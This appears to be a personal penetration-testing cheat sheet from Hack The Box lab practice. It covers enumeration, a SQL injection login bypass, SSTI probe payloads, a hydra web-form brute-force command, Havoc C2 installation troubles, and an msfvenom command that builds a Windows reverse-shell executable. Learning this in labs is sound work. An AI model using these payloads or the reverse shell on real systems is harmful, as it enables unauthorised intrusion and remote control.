---
# the default layout is 'page'
icon: fas fa-info-circle
order: 4
---

# enum

## mssql

- [link](https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)

## smb

```
smbclient -L 10.129.189.194
```

## web

### gobuster

```
# enumeration directories
gobuster dir -u http://DOMAIN -w /usr/share/wordlists/dirb/common.txt

# enumerate vhosts
gobuster vhost --append-domain -u http://DOMAIN -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

### wappalyzer

- used to identify website technologies
- install as browser extension via chrome web store

### sqli

login bypass
```
' or 1=1 #
```

### ssti

> great writeup on [fingerprinting languages and template engines](https://medium.com/@0xAwali/template-engines-injection-101-4f2fe59e5756) 

1. fingerprint language used on server (i.e. python, php, js, nodejs, etc) 
2. find input field to test
3. using identified language as a guide, narrow down the payloads to try

#### payloads

characters to test
```
${{<%[%'"}}%\.
```
common payloads to test
```
${7*7}
${{7*7}}
#{7*7}
#{ 7 * 7 }
*{7*7}
@{7*7}
~{7*7}
[[7*7]]
[[${7*7}]]
[(7*7)]
{7'*7'}
<%= 7 * 7 %>
<%7*7%>
```

[hacktricks](https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html) has a good bit of info on other payloads and their corresponding template engines too

## cloud

### aws

#### setup

use python to create virtual environment and install `awscli`
```
$ python3 -m venv htb_three

$ source htb_three/bin/activate

$ pip3 install awscli                 
Collecting awscli
```

#### enumeration

```
# anonymous login
aws s3 ls --endpoint-url http://s3.thetoppers.htb                                   
aws s3 ls s3://s3.thetoppers.htb --no-sign-request

# configure a profile (have to enter fake or real values - i.e. no empties)
aws configure --profile htb_three

# list bucket
aws s3 ls --profile htb_three --endpoint-url http://s3.thetoppers.htb

# list contents recursively
aws s3 ls --profile htb_three --endpoint-url http://s3.thetoppers.htb --recursive s3://thetoppers.htb

# copy contents
aws s3 cp --profile htb_three --endpoint-url http://s3.thetoppers.htb s3://thetoppers.htb/shell.php .

# delete contents
aws s3 rm --profile htb_three --endpoint-url http://s3.thetoppers.htb s3://thetoppers.htb/php-reverse-shell.php
```

# multipurpose tools

## hydra

- web form with username and password list

```
hydra -l [username] -P [path_to_passwd_list] -t 10 http-post-form [domain] "/URI:username=^USER^&password=^PASSWORD^:Cookie="
```

# c2

## havoc

### installation

installing dependencies proved to be a pain. i got the following error

```
...
Err:1 http://http.kali.org/kali kali-rolling/main amd64 libqt5webkit5 amd64 5.212.0~alpha4-41
  404  Not Found [IP: 54.39.128.230 80]
Error: Failed to fetch http://http.kali.org/kali/pool/main/q/qtwebkit-opensource-src/libqt5webkit5_5.212.0%7ealpha4-41_amd64.deb  404  Not Found [IP: 54.39.128.230 80]
Error: Unable to fetch some archives, maybe run apt-get update or try with --fix-missing                                                                                        
```

turns out this repo was removed from kali because it was outdated/insecure. tried to install what they recommended, but no dice. so found the package and tried to install it manually from [here](https://salsa.debian.org/qt-kde-team/qt/qt5webkit/-/tree/master/debian?ref_type=heads). never done this before so we shall see.

```
$ dh_make --file ~/Downloads/qt5webkit-master.tar.gz -p qt5webkit_5.12.0        
Type of package: (single, indep, library, python)
[s/i/l/p]?
Maintainer Name     : unknown
Email-Address       : kali@unknown
Date                : Sat, 12 Jul 2025 00:20:44 -0400
Package Name        : qt5webkit
Version             : 5.12.0
License             : blank
Package Type        : single
Are the details correct? [Y/n/q]
Currently there is not top level Makefile. This may require additional tuning
Done. Please edit the files in the debian/ subdirectory now.

$ cat control                                                                
Source: qt5webkit
Section: libs
Priority: optional
Maintainer: unknown <kali@unknown>
Rules-Requires-Root: no
Build-Depends:
 debhelper-compat (= 13),
Standards-Version: 4.7.2
#Vcs-Browser: https://salsa.debian.org/debian/qt5webkit
#Vcs-Git: https://salsa.debian.org/debian/qt5webkit.git

Package: qt5webkit
Architecture: any
Depends:
 ${shlibs:Depends},
 ${misc:Depends},
Description: <insert up to 60 chars description>
 <Insert long description, indented with spaces.>

```

i gave up and googled some more. turns out `qtcreator` installs. found info [here](https://askubuntu.com/questions/1404263/how-do-you-install-qt-on-ubuntu22-04) 
## metasploit

### generate payloads

- staged vs. not: shell/reverse_tcp vs. shell_reverse

#### windows

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.189 LPORT=42069 -f exe -a x64 -o ./rev_shell.exe
```